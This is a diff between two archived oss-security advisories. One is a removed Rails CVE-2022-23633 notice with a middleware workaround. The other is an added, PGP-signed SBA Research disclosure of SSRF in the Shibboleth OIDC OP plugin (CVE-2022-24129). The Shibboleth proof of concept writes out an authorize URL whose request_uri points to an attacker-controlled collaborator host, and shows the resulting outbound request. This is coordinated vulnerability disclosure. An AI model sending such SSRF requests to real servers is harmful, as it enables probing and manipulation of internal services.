@@ -1,73 +1,143 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/02/11/5
-Message-ID: <CALBaBG95cw-_ZPCi+pppp_uhvX1ydSf=FP+sxfG-j4GDvieBFQ@mail.gmail.com>
-Date: Fri, 11 Feb 2022 12:39:10 -0800
-From: Aaron Patterson <aaron.patterson@...il.com>
-To: oss-security@...ts.openwall.com, ruby-security-ann@...glegroups.com,  rubyonrails-security@...glegroups.com
-Subject: [CVE-2022-23633] Possible exposure of information vulnerability in Action Pack
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/31/5
+Message-ID: <5cd074e373774f239419d7a90bf7c5e4@SATVIEEX03.securityresearch.local>
+Date: Mon, 31 Jan 2022 17:23:58 +0000
+From: SBA - Advisory <advisory@...-research.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: [SBA-ADV-20220127-01] CVE-2022-24129: Shibboleth Identity Provider OIDC OP Plugin 3.0.3 or below Server-Side Request Forgery
 Content-Type: text/plain; charset=utf-8
 
-## Impact
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Under certain circumstances response bodies will not be closed, for example
-a bug in a webserver[1] or a bug in a Rack middleware. In the event a
-response is not notified of a close, ActionDispatch::Executor will not know
-to reset thread local state for the next request. This can lead to data
-being leaked to subsequent requests, especially when interacting with
-ActiveSupport::CurrentAttributes.
+# Shibboleth Identity Provider OIDC OP Plugin Server-Side Request Forgery #
 
-Upgrading to the FIXED versions of Rails will ensure mitigation if this
-issue even in the context of a buggy webserver or middleware implementation.
+Link: https://github.com/sbaresearch/advisories/tree/public/2022/SBA-ADV-20220127-01_Shibboleth_IdP_OIDC_OP_Plugin_SSRF
 
-## Patches
+## Vulnerability Overview ##
 
-To aid users who aren't able to upgrade immediately we have provided
-patches for
-the two supported release series. They are in git-am format and consist of a
-single changeset.
+Shibboleth Identity Provider OIDC OP plugin 3.0.3 or below is prone to a server-side request forgery (SSRF) vulnerability due to an insufficient restriction of the `request_uri` parameter. This allows unauthenticated attackers to interact with arbitrary third-party HTTP services.
 
-* 5.2-information-leak.patch
-* 6.0-information-leak.patch
-* 6.1-information-leak.patch
-* 7.0-information-leak.patch
+* **Identifier**            : SBA-ADV-20220127-01
+* **Type of Vulnerability** : Server-Side Request Forgery (SSRF)
+* **Software/Product Name** : [Identity Provider OIDC OP Plugin](https://shibboleth.atlassian.net/wiki/spaces/IDPPLUGINS/pages/1376878976/OIDC+OP)
+* **Vendor**                : Shibboleth Consortium
+* **Affected Versions**     : <= 3.0.3
+* **Fixed in Version**      : 3.0.4
+* **CVE ID**                : CVE-2022-24129
+* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
+* **CVSS Base Score**       : 8.6 (High)
 
-## Workarounds
+## Vendor Description ##
 
-Upgrading is highly recommended, but to work around this problem the
-following middleware can be used:
+> The OIDC OP plugin is the successor to the original GEANT-funded 
+> add-on to Shibboleth and is now available as an offically-supported 
+> plugin for IdP
+> V4.1 and above. It provides conformant OIDC OP functionality alongside 
+> the SAML and CAS support previously native to the IdP software.
 
+Source: <https://shibboleth.atlassian.net/wiki/spaces/IDPPLUGINS/pages/1376878976/OIDC+OP>
+
+## Impact ##
+
+An unauthenticated attacker can interact with arbitrary third-party HTTP services by exploiting the vulnerability documented in this advisory. This might lead to manipulation of internal services accessible by the server running the affected software. Moreover, an attacker can send malicious requests to external services, while the server running the affected software appears as the source of the attack.
+
+## Vulnerability Description ##
+
+The OIDC specification allows an OIDC RP to send authentication requests via a request object. These request objects can be either sent directly as `request` parameter or indirectly by passing an URL as `request_uri` parameter. In the latter case, the OIDC provider fetches the request object via an HTTP-GET request from the specified URL.
+
+The Shibboleth OIDC OP plugin supports this behavior, but does not validate the passed `request_uri` before issuing the HTTP-GET request.
+An unauthenticated attacker might exploit this to perform server-side request forgery and issue malicious HTTP-GET requests to services reachable by the server running the plugin. For example, an attacker could try to access protected internal services which are not reachable from public or adjacent networks, otherwise.
+
+The Shibboleth OIDC OP plugin does not return information from the issued HTTP response to the attacker when it cannot parse the response as JWS.
+Therefore, the ability of an attacker is mostly limited to initiate operations on HTTP services.
+Additionally, an attacker can find out the exact Shibboleth IdP version by letting the OIDC OP plugin connect to an attacker-controlled service and inspecting the user agent header of the HTTP request.
+
+## Proof of Concept ##
+
+We set up an Shibboleth IdP version 4.1.5 with the OIDC OP plugin 3.0.3 and deployed the following client metadata.
+
+```json
+[
+  {
+    "scope":"openid email",
+    "redirect_uris":["https://demorp.example.org/redirect_uri"],
+    "client_id":"demo_rp",
+    "client_secret":"topsecret",
+    "response_types":["code"],
+    "grant_types":["authorization_code"],
+    "request_uris":["https://example.org"]
+  }
+]
 ```
-class GuardedExecutor < ActionDispatch::Executor
-  def call(env)
-    ensure_completed!
-    super
-  end
 
-  private
+In the client metadata we first specified no `request_uris` parameter. We then also tried to set the `request_uris` parameter to `https://example.org` (see above), both leading to the following behavior.
 
-    def ensure_completed!
-      @executor.new.complete! if @executor.active?
-    end
-end
+We issued an authentication request via the following URL specifying an `request_uri` parameter pointing to an attacker-controlled server:
 
-# Ensure the guard is inserted before ActionDispatch::Executor
-Rails.application.configure do
-  config.middleware.swap ActionDispatch::Executor, GuardedExecutor, executor
-end
+```plain
+https://idp.example.org/idp/profile/oidc/authorize?client_id=demo_rp&request_uri=https://na1wjvvodi7fua6a3ulaxtq48vel2a.burpcollaborator.net
 ```
 
-## Credits
+On the attacker-controlled server we received the following request:
 
-Thanks to Jean Boussier for fixing this!
+```http
+GET / HTTP/1.1
+Host: na1wjvvodi7fua6a3ulaxtq48vel2a.burpcollaborator.net
+Connection: Keep-Alive
+User-Agent: ShibbolethIdp/4.1.5 OpenSAML/4.1.1
+Accept-Encoding: gzip,deflate
+Connection: close
+```
 
-1. https://github.com/puma/puma/pull/2812
+Additionally, the Shibboleth IdP logged the following output:
 
-Content of type "text/html" skipped
+```plain
+2022-01-28 20:22:58,290 - 127.0.0.1 - ERROR [net.shibboleth.idp.plugin.oidc.op.profile.impl.SetRequestObjectToResponseContext:144] - Profile Action SetRequestObjectToResponseContext: Unable to parse request object from request_uri, Invalid JWT serialization: Missing dot delimiter(s) ```
 
-Download attachment "6.1-information-leak.patch" of type "application/octet-stream" (4161 bytes)
+This indicates that the OIDC OP plugin sent the HTTP request, but could not parse the HTTP response.
 
-Download attachment "6.0-information-leak.patch" of type "application/octet-stream" (4161 bytes)
+## Recommended Countermeasures ##
 
-Download attachment "7.0-information-leak.patch" of type "application/octet-stream" (5474 bytes)
+As a countermeasure for the vendor we recommend to only accept the `request_uri` parameter when an allow list is configured in the client metadata and the supplied `request_uri` matches the client metadata.
+Additionally, the allow list should not be arbitrarily configurable via the dynamic client-registration endpoint.
 
-Download attachment "5.2-information-leak.patch" of type "application/octet-stream" (4158 bytes)
+According to the vendor this countermeasure was implemented in version 3.0.4, therefore we recommend users to use versions 3.0.4 or later.
+
+## Timeline ##
+
+* `2022-01-27`: identification of vulnerability in version 3.0.3
+* `2022-01-27`: initial vendor contact
+* `2022-01-27`: disclosed vulnerability to vendor security contact
+* `2022-01-28`: vendor acknowledged vulnerability
+* `2022-01-29`: request CVE from MITRE
+* `2022-01-30`: MITRE assigned CVE-2022-24129
+* `2022-01-31`: vendor released version 3.0.4
+* `2022-01-31`: public disclosure
+
+## References ##
+
+* OpenID Connect specification: <https://openid.net/specs/openid-connect-core-1_0.html#RequestUriParameter>
+* Vendor security advisory: <https://shibboleth.net/community/advisories/secadv_20220131.txt>
+
+## Credits ##
+
+* David Gnedt ([SBA Research](https://www.sba-research.org/))
+* Andreas Bernauer-Puchegger ([SBA Research](https://www.sba-research.org/))
+* Franz Wieshaider ([SBA Research](https://www.sba-research.org/))
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAmH4GxUACgkQ+7iGL1j3
+dbLdDw/+MSCczpIDG70Mr0T3ofvumuMe3K8L58z50kYSRA3uXhCbNKKlG10UWdlS
+Xw7v8SKpSWkoU3rgiAETRRFFJiWd4lJTqESz3gv+wM9wsD5h2Z3GG4JaaBTooT1w
+xaxdRNyO/iaQl/edhr8EFKJPVsXIVNbc8oEUjz6DVx+RhBhvfoKpU5H9i5Y6wYLW
+maTS8iYeEbyk4ij0y6At2P84y07/MnJt0JiczSBPNc2P2//Fu341zZ25rmbgvb5/
+Rq91KgSzpdlTaRjEHNXaazVEO1bgN3rAdgyI+ey2kEKwa9DweO0xgaf+r0xUMpHU
+oMbM2W8u2/n6Bc6fW3DccMLw1F4ZFeOoEwla6M0N4DQqAyBoqc8UI4oPLyWy56eA
+SzOhDeinGP43Tgz1O7x+RRVjeUErHut2FmVxKdHXlFmg7xCXRViuzV9AAftwNmYC
+VdTJyoZrvFp4+mEIxSqmSxTc3WKrR/XeIWXfPnM//cQwCEPFiSSZZRx3ZcIzx7Iv
+8zpj/JZpqzo29nz044gWvID9e700JvSA/In+rkgus4NnDTVO0YA1ZIfK770qExiP
+FwH2uTMur2WvIy/Yi/7V0ydOg+KFAv+BYaxsdLJGvOD9kCJ/MGxAV13QJlS5ZVaD
+TjpF0g81s8VffeCqr2sU5fLQzSfPEHFQ/HVYZ7a72231/0/QAio=
+=12zz
+-----END PGP SIGNATURE-----
